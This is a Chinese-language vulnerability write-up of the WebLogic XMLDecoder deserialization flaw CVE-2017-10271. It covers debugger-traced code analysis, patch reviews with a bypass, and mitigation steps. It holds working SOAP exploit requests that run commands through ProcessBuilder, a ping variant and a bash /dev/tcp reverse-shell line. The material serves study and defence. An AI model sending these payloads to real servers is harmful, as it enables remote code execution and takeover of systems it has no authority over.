# CVE-2017-10271 Weblogic-XMLDecoder

  
  
&lt;!--more--&gt;  
## 0x01 环境搭建  
https://www.penson.top/article/av40  
## 0x02 漏洞分析与复现  
### 简单的XMLEncoder和XMLDecoder  
XMLDecoder/XMLEncoder是在JDK1.4版本中添加的XML格式序列化持久性方案，使用XMLEncoder来生成表示JavaBeans组件的(bean)的XML文档，用XMLDecoder读取使用XMLEncoder创建的XML文档获取JavaBeans。  
一些简单的Demo如下  
### XMLEncoder  
```java  
import javax.swing.*;    
import java.beans.XMLEncoder;    
import java.io.BufferedOutputStream;    
import java.io.FileOutputStream;    
    
public class XMLEncoderExample {    
    public static void main(String[] args) throws Exception {    
        FileOutputStream file = new FileOutputStream(&#34;result.xml&#34;);    
        XMLEncoder xmlEncoder = new XMLEncoder(new BufferedOutputStream(file));    
        xmlEncoder.writeObject(new JButton(&#34;Hello World&#34;));    
        xmlEncoder.close();    
    }    
}  
```  
序列化了`JButton`类，得到的XML文档如下  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409031538155.png)
### XMLDecoder  
代码如下  
```java  
import java.beans.XMLDecoder;    
import java.io.BufferedInputStream;    
import java.io.FileInputStream;    
    
public class XMLDecoderExample {    
    public static void main(String[] args) throws Exception {    
        FileInputStream file = new FileInputStream(&#34;result.xml&#34;);    
        XMLDecoder xmlDecoder = new XMLDecoder(new BufferedInputStream(file));    
        Object o = xmlDecoder.readObject();    
        System.out.println(o);    
        xmlDecoder.close();    
    }    
}  
```  
使用XMLDecoder读取序列化的XML文档，获取JButton类并打印，输出如下  
`javax.swing.JButton[,0,0,0x0,invalid,alignmentX=0.0,alignmentY=0.5,border=com.apple.laf.AquaButtonBorder$Dynamic@7e6cbb7a,flags=288,maximumSize=,minimumSize=,preferredSize=,defaultIcon=,disabledIcon=,disabledSelectedIcon=,margin=javax.swing.plaf.InsetsUIResource[top=0,left=2,bottom=0,right=2],paintBorder=true,paintFocus=true,pressedIcon=,rolloverEnabled=false,rolloverIcon=,rolloverSelectedIcon=,selectedIcon=,text=Hello World,defaultCapable=true]  
`  
### XML基础属性  
#### string标签  
`hello world`字符串的表示方式为`&lt;string&gt;Hello World&lt;/string&gt;`  
#### object标签  
通过`&lt;object&gt;`标签表示对象，`class`属性置顶具体类(用于调用其内部方法)，`method`属性指定具体方法名称(比如构造函数的方法名为`new`)  
new JButton(&#34;Hello world&#34;)，对应的`XML`文档  
```xml  
&lt;object class=&#34;javax.swing.JButton&#34;&gt;    
 &lt;string&gt;Hello World&lt;/string&gt;    
&lt;/object&gt;  
```  
#### void标签  
通过`void`标签表示函数调用、赋值等操作，`method`属性置顶具体的方法名称。  
`JButton b = new JButton();b.setText(&#34;Hello world&#34;);`对应的`XML`文档  
```java  
&lt;object class=&#34;javax.swing.JButton&#34;&gt;  
    &lt;void method=&#34;setText&#34;&gt;  
    &lt;string&gt;Hello world&lt;/string&gt;  
    &lt;/void&gt;  
&lt;/object&gt;  
```  
#### array标签  
通过`array`标签表示数组，`class`属性指定具体类，内部`void`标签的`index`属性表示根据指定数组索引赋值  
`String[] s = new String[3];s[1] = &#34;Hello world&#34;;`对应的`XML`文档  
### 漏洞影响版本  
`WebLogic`存在`WLS-WebServices`的组件皆会受到影响  
### 漏洞原理  
Weblogic的WLS Security组件对外提供WebService服务，其中使用XMLDecoder来解XML格式数据，其存在反序列化漏洞，从而导致RCE。  
下面来看一个解析xml导致反序列化命令执行的Demo  
```java  
import java.beans.XMLDecoder;    
import java.io.BufferedInputStream;    
import java.io.FileInputStream;    
    
public class XMLDecoderEvilDemo {    
    public static void main(String[] args) throws Exception {    
        FileInputStream file = new FileInputStream(&#34;/Users/f10wers13eicheng/Desktop/JavaSecuritytalk/XMLDemo/result.xml&#34;);    
        XMLDecoder xmldecoder = new XMLDecoder(new BufferedInputStream(file));    
        Object o = xmldecoder.readObject();    
        xmldecoder.close();    
    }    
}  
```  
对应的`result.xml`如下  
```xml  
&lt;java version=&#34;1.4.0&#34; class=&#34;java.beans.XMLDecoder&#34;&gt;    
 &lt;void class=&#34;java.lang.ProcessBuilder&#34;&gt;    
  &lt;array class=&#34;java.lang.String&#34; length=&#34;1&#34;&gt;    
   &lt;void index=&#34;0&#34;&gt;    
    &lt;string&gt;/System/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/string&gt;    
   &lt;/void&gt;  &lt;/array&gt;  &lt;void method=&#34;start&#34;/&gt;&lt;/void&gt;    
&lt;/java&gt;  
```  
使用  
`java.lang.ProcessBuilder`进行代码执行，整个恶意XML反序列化后相当于执行代码：  
```java  
String[] cmd = new String[1];  
cmd[0] = &#34;Calc&#34;;  
new ProcessBuilder(cmd).start();  
```  
### 漏洞复现与分析  
Weblogic本质上是`Web Service`服务，报文内容类型是`SOAP`型`WebService`报文，所以`/wls-wsat/CoordinatorPortType`接口可以接受XML数据的请求包  
构造恶意XML文件，  
```xml  
&lt;java version=&#34;1.4.0&#34; class=&#34;java.beans.XMLDecoder&#34;&gt;    
 &lt;void class=&#34;java.lang.ProcessBuilder&#34;&gt;    
  &lt;array class=&#34;java.lang.String&#34; length=&#34;1&#34;&gt;    
   &lt;void index=&#34;0&#34;&gt;    
    &lt;string&gt;Calc&lt;/string&gt;    
   &lt;/void&gt;  &lt;/array&gt;  &lt;void method=&#34;start&#34;/&gt;&lt;/void&gt;    
&lt;/java&gt;  
```  
POST包整体如下  
```http  
POST /wls-wsat/CoordinatorPortType HTTP/1.1  
Host: 10.211.55.26:7001  
Cache-Control: max-age=0  
Upgrade-Insecure-Requests: 1  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36  
Accept: text/html,application/xhtml&#43;xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7  
Accept-Encoding: gzip, deflate, br  
Accept-Language: zh-CN,zh;q=0.9  
Connection: close  
Content-Type: text/xml  
Content-Length: 482  
  
&lt;soapenv:Envelope xmlns:soapenv=&#34;http://schemas.xmlsoap.org/soap/envelope/&#34;&gt; &lt;soapenv:Header&gt;  
&lt;work:WorkContext xmlns:work=&#34;http://bea.com/2004/06/soap/workarea/&#34;&gt;  
&lt;java version=&#34;1.4.0&#34; class=&#34;java.beans.XMLDecoder&#34;&gt;  
&lt;void class=&#34;java.lang.ProcessBuilder&#34;&gt;  
&lt;array class=&#34;java.lang.String&#34; length=&#34;1&#34;&gt;  
&lt;void index=&#34;0&#34;&gt;  
&lt;string&gt;Calc&lt;/string&gt;  
&lt;/void&gt;  
&lt;/array&gt;  
&lt;void method=&#34;start&#34;/&gt;&lt;/void&gt;  
&lt;/java&gt;  
&lt;/work:WorkContext&gt;  
&lt;/soapenv:Header&gt;  
&lt;soapenv:Body/&gt;  
&lt;/soapenv:Envelope&gt;  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409031607572.png)
如果是弹shell或者ping命令探测  
```xml  
&lt;soapenv:Envelope xmlns:soapenv=&#34;http://schemas.xmlsoap.org/soap/envelope/&#34;&gt; &lt;soapenv:Header&gt;      
&lt;work:WorkContext xmlns:work=&#34;http://bea.com/2004/06/soap/workarea/&#34;&gt;      
&lt;java version=&#34;1.4.0&#34; class=&#34;java.beans.XMLDecoder&#34;&gt;      
&lt;void class=&#34;java.lang.ProcessBuilder&#34;&gt;      
&lt;array class=&#34;java.lang.String&#34; length=&#34;3&#34;&gt;      
&lt;void index=&#34;0&#34;&gt;      
&lt;string&gt;/bin/bash&lt;/string&gt;      
&lt;/void&gt;      
&lt;void index=&#34;1&#34;&gt;      
&lt;string&gt;-c&lt;/string&gt;      
&lt;/void&gt;      
&lt;void index=&#34;2&#34;&gt;      
&lt;string&gt;ping xxx.com&lt;/string&gt;      
&lt;/void&gt;      
&lt;/array&gt;      
&lt;void method=&#34;start&#34;/&gt;&lt;/void&gt;      
&lt;/java&gt;      
&lt;/work:WorkContext&gt;      
&lt;/soapenv:Header&gt;      
&lt;soapenv:Body/&gt;      
&lt;/soapenv:Envelope&gt;  
```  
弹`shell`  
`&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/ip/port 0&amp;gt;&amp;amp;1&lt;/string&gt;`  
### 漏洞分析  
可以看到`server/lib/wls-wsat.war/WEB-INF/web.xml`文档中存在许多接口，这些接口都可以对SOAP报文进行处理，也就是说，这些接口都存在`Weblogic XMLDecoder`反序列化漏洞  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409031611700.png)
接着到`weblogic.wsee.jaxws.workcontext.WorkContextServerTube#processRequest`方法，这个方法对接口数据进行了初步的处理，打断点调试  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409031623894.png)
此处的`var1`为我们的恶意xml数据，var2获取了xml header，也就是`text/xml`，并将其转换为列表形式，var3是从var2中获取`WorkAreaConstants.WORK_AREA_HEADER`得到的，最后将`var3`放入`readHeaderOld()`方法进行处理。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409031627246.png)
跟进，在构造出`var6`之前，本质上都是在做赋值的工作，var4获取了恶意XML数据里面的内容部分。关于var6的构造，我们需要跟进`WorkContextXmlInputAdapter`类的构造函数  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409031628103.png)
可以看到本质上是`new`了一个`XMLDecoder`类，并将`var4`的内容(XML数据里的内容)赋了进去。继续往下，跟进`receive()`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409031630944.png)
`receive()`方法生成了处理`XMLDecoder`类的处理器，进行下一步`receiveRequest()`的处理，在跟进  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409031631542.png)
在跟进`readEntry()`方法，`readEntry()`方法调用了`readUTF()`方法，跟进`readUTF()`方法，上面一直在做层层封装的工作  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409031632330.png)
在`readUTF()`方法中，调用了`readObject`方法，对XML数据进行反序列化解析。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409031633449.png)
## 0x03 漏洞修复  
### CVE-2017-3506 补丁分析  
这里补丁在`WorkContextXmlInputAdapter`中添加了`validate`验证，限制了`object`标签，从而限制通过XML来构造类  
```java  
private void validate(InputStream is) {  
      WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();  
      try {  
         SAXParser parser = factory.newSAXParser();  
         parser.parse(is, new DefaultHandler() {  
            public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {  
               if(qName.equalsIgnoreCase(&#34;object&#34;)) {  
                  throw new IllegalStateException(&#34;Invalid context type: object&#34;);  
               }  
            }  
         });  
      } catch (ParserConfigurationException var5) {  
         throw new IllegalStateException(&#34;Parser Exception&#34;, var5);  
      } catch (SAXException var6) {  
         throw new IllegalStateException(&#34;Parser Exception&#34;, var6);  
      } catch (IOException var7) {  
         throw new IllegalStateException(&#34;Parser Exception&#34;, var7);  
      }  
   }  
```  
绕过方法很简单，将`object`修改成`void`，也就是最开始漏洞复现exp  
### CVE-2017-10271补丁分析  
```java  
private void validate(InputStream is) {  
   WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();  
   try {  
      SAXParser parser = factory.newSAXParser();  
      parser.parse(is, new DefaultHandler() {  
         private int overallarraylength = 0;  
         public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {  
            if(qName.equalsIgnoreCase(&#34;object&#34;)) {  
               throw new IllegalStateException(&#34;Invalid element qName:object&#34;);  
            } else if(qName.equalsIgnoreCase(&#34;new&#34;)) {  
               throw new IllegalStateException(&#34;Invalid element qName:new&#34;);  
            } else if(qName.equalsIgnoreCase(&#34;method&#34;)) {  
               throw new IllegalStateException(&#34;Invalid element qName:method&#34;);  
            } else {  
               if(qName.equalsIgnoreCase(&#34;void&#34;)) {  
                  for(int attClass = 0; attClass &lt; attributes.getLength(); &#43;&#43;attClass) {  
                     if(!&#34;index&#34;.equalsIgnoreCase(attributes.getQName(attClass))) {  
                        throw new IllegalStateException(&#34;Invalid attribute for element void:&#34; &#43; attributes.getQName(attClass));  
                     }  
                  }  
               }  
               if(qName.equalsIgnoreCase(&#34;array&#34;)) {  
                  String var9 = attributes.getValue(&#34;class&#34;);  
                  if(var9 != null &amp;&amp; !var9.equalsIgnoreCase(&#34;byte&#34;)) {  
                     throw new IllegalStateException(&#34;The value of class attribute is not valid for array element.&#34;);  
                  }  
```  
依然是进行黑名单判断  
临时解决方案  
根据业务所有需求，考虑是否删除WLS-WebServices组件，包含此组件路径为：  
```java  
Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat   
Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.war   
Middleware/wlserver_10.3/server/lib/wls-wsat.war  
```  
以上路径都在Weblogic安装处。删除以上文件之后，需重启Weblogic。确认`http://weblogic_ip/wls-wsat/` 是否为 404 页面。  
  

---

> Author: N1Rvana  
> URL: http://localhost:1313/cve-2017-10271-weblogic-xmldecoder/  

